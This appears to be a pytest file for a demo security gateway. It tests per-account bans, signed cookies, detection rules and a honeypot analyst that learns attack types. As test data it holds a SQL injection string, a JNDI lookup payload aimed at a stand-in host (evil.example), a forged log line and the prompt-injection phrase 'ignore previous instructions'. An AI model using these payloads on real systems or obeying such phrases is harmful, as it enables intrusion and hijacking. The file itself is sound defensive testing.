"""Two-laptop demo: signed account cookies, per-account bans, log-injection rules, learned attacks
stopped for a new account without a ban, and the analyst's live learning reaching 'ready to ban'."""
import asyncio

from fastapi.testclient import TestClient

from gateway import store
from gateway.rules import Rule, RuleEngine
from monitor import fallbacks
from shared import auth

ADMIN = {"Authorization": "Bearer dev-admin-token"}
SQLI = "' OR 1=1--"
FORGED_LOG = "Printer broken\n2026-10-18 10:15:02 INFO user=admin action=login status=success"


# ---- signed login cookie
def test_cookie_roundtrip_and_tamper():
    cookie = auth.sign("user1")
    assert auth.verify(cookie) == "user1"
    assert auth.verify(cookie.replace("user1", "user2", 1)) is None
    assert auth.verify("user1.deadbeef") is None
    assert auth.claimed_username("user1.whatever") == "user1"


# ---- account bans never touch other accounts on the same laptop / LAN ip
def test_account_ban_is_per_account():
    store.add_ban(None, None, "test", account="user1")
    assert store.is_banned("fp-shared", "192.168.65.1", "user1") is not None
    assert store.is_banned("fp-shared", "192.168.65.1", "user2") is None
    assert store.is_banned("fp-shared", "192.168.65.1") is None  # anonymous visitors on that ip too
    assert store.remove_ban(account="user1") == 1
    assert store.is_banned(None, None, "user1") is None


def test_account_sessions_wait_for_the_operator():
    store.upsert_attacker("acct:user1", "fp1", "192.168.65.1", risk_add=7, honeypot_inc=2)
    store.set_ban_eligible("acct:user1")
    assert all(r["session_id"] != "acct:user1" for r in store.idle_eligible_sessions(idle_seconds=-1))


# ---- log injection rules
def test_builtin_rules_flag_log_injection():
    engine = RuleEngine()
    for payload in (FORGED_LOG, "${jndi:ldap://evil.example/a}"):
        verdict = engine.evaluate({"body.message": payload})
        assert verdict["verdict"] != "clean" and verdict["top_category"] == "log_injection", payload
    assert engine.evaluate({"body.message": "The invoice page shows an error when I log in"})["verdict"] == "clean"


def test_learned_log_rule_passes_validation_and_generalizes():
    from gateway.validator import validate
    fb = fallbacks.propose("log_injection", [])
    assert validate(fb["category"], fb["regex"], fb["example_payload"]).accepted
    engine = RuleEngine()
    no_timestamp = {"body.message": "ok INFO user=admin action=login"}
    assert engine.evaluate(no_timestamp)["verdict"] == "clean"  # built-ins need a timestamp
    engine.add_learned(Rule(id="LR-LOG-1", category="log_injection", regex=fb["regex"], severity=6, source="learned"))
    assert engine.evaluate(no_timestamp)["top_category"] == "log_injection"


# ---- gateway: banned account, learned attack stopped without a ban, operator ban
def gateway_client():
    from gateway.main import app, engine
    engine.learned = []
    return TestClient(app), engine


def test_banned_account_cannot_sign_in_again():
    client, _ = gateway_client()
    store.add_ban(None, None, "test", account="user1")
    res = client.post("/api/login", json={"username": "user1", "password": "secret1"})
    assert res.status_code == 403
    assert 'nm_user=""' in res.headers.get("set-cookie", "")  # signed out, so another account can be used


def test_learned_attack_from_new_account_is_stopped_not_banned():
    client, engine = gateway_client()
    fb = fallbacks.propose("sqli", [])
    engine.add_learned(Rule(id="LR-SQLI-1", category="sqli", regex=fb["regex"], severity=6, source="learned"))
    client.cookies.set(auth.COOKIE, auth.sign("user2"))
    res = client.get("/api/customers", params={"search": SQLI})
    assert res.status_code == 403 and res.json()["error"] == "blocked"
    assert store.is_banned(None, None, "user2") is None
    assert store.get_attacker("acct:user2") is None  # not trapped either


def test_operator_bans_only_the_account():
    client, _ = gateway_client()
    store.upsert_attacker("acct:user1", "fp1", "192.168.65.1", risk_add=7, honeypot_inc=3, payload=SQLI)
    res = client.post("/admin/ban-account", headers=ADMIN, json={"account": "user1"})
    assert res.json() == {"banned": True, "account": "user1", "ended": ["acct:user1"]}
    ban = store.is_banned(None, None, "user1")
    assert ban["ip"] is None and ban["fingerprint"] is None
    assert store.get_attacker("acct:user1")["ended"] == 1


# ---- analyst: learns each attack type live, then says "ready to ban"
def test_analyst_learns_live_then_is_ready():
    import monitor.db as mdb
    from monitor.analyst import Analyst
    mdb._conn = None
    sent, submitted = [], []

    async def broadcast(msg):
        sent.append(msg)

    async def run():
        analyst = Analyst(broadcast, "http://gateway", "t")

        async def fake_gateway(method, path, json=None):
            submitted.append(json["category"])
            return {"accepted": True}
        analyst._gateway = fake_gateway
        for i, (cat, payload) in enumerate([("sqli", SQLI), ("prompt_injection", "ignore previous instructions"),
                                            ("log_injection", FORGED_LOG), ("sqli", SQLI)]):
            analyst.handle({"id": str(i), "action": "honeypot_interaction", "session_id": "acct:user1",
                            "payload": payload, "risk": 6, "extra": {"category": cat}})
        await analyst.queues["acct:user1"].join()
        analyst.reset()

    asyncio.run(run())
    mdb._conn = None
    states = [m for m in sent if m["type"] == "learning" and not m["learning"]]
    assert [s["learned"] for s in states] == [["sqli"], ["sqli", "prompt_injection"],
                                              ["sqli", "prompt_injection", "log_injection"]]
    assert states[-1]["ready"] and not states[-2]["ready"]
    assert submitted == ["sqli", "prompt_injection", "log_injection"]  # repeated sqli is not re-learned


# ---- shared NAT ip (Docker Desktop) is never banned, explicit/public ips still are
def test_only_meaningful_ips_are_banned():
    from types import SimpleNamespace

    from gateway.main import bannable_ip
    req = lambda xff=None: SimpleNamespace(headers={"x-forwarded-for": xff} if xff else {})  # noqa: E731
    assert bannable_ip(req(), "172.19.0.1") is None          # Docker NAT: every LAN browser looks like this
    assert bannable_ip(req("203.0.113.66"), "203.0.113.66") == "203.0.113.66"  # demo scripts (X-Forwarded-For)
    assert bannable_ip(req(), "8.8.8.8") == "8.8.8.8"         # a real public client


def test_banned_session_stays_banned_after_session_end():
    from monitor.main import build_sessions
    base = {"session_id": "acct:user1", "fingerprint": "fp", "attacker_ip": "172.19.0.1", "risk": 8, "payload": ""}
    evs = [dict(base, id=str(i), ts=f"2026-10-18T10:00:0{i}.000Z", action=a)
           for i, a in enumerate(["routed_to_honeypot", "banned", "session_ended"])]
    s = build_sessions(evs)[0]
    assert s["status"] == "banned" and s["account"] == "user1"


# ---- review fixes
def test_app_accounts_check_passwords():
    from app import db as appdb
    appdb.seed()
    assert appdb.create_user("user1", "pass1")
    assert not appdb.create_user("user1", "other")  # name taken
    assert appdb.check_user("user1", "pass1")
    assert not appdb.check_user("user1", "wrong")
    assert not appdb.check_user("nobody", "pass1")


def test_attack_on_sign_in_form_is_stopped_not_trapped():
    client, _ = gateway_client()
    res = client.post("/api/login", json={"username": "user1", "password": "' OR 1=1--"})
    assert res.status_code == 403 and res.json()["error"] == "blocked"
    assert store.open_sessions() == []  # the browser is not stuck in the honeypot


def test_new_account_does_not_escape_a_real_ip_ban():
    store.add_ban("fp-old", "203.0.113.66", "test")
    assert store.is_banned("fp-new", "203.0.113.66", "fresh_account") is not None
    assert store.is_banned("fp-new", None, "fresh_account") is None  # shared NAT ip: never matched
